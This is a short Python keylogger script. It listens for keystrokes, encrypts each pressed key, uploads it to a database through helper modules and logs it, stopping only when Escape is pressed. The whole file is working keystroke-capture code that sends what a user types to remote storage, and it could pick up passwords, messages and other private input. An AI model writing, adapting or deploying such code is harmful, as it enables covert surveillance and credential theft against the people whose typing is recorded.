import logging
from utils.db_operations import *
from utils.encryption import *

"""
Keylogging the keys pressed by the user.
"""

print("Key Logging Has Begun...")
break_program = False
def on_press(key):
    global break_program
    if key!=Key.esc:
        s = str(key)[1] + 'x'
        # print(s)
        encryptedKey = encrypt(s)
        uploadToDatabase(str(encryptedKey)) 
        logging.info(str(key)) 
    else:
        exit(1)

with Listener(on_press=on_press) as listener:
    listener.join()
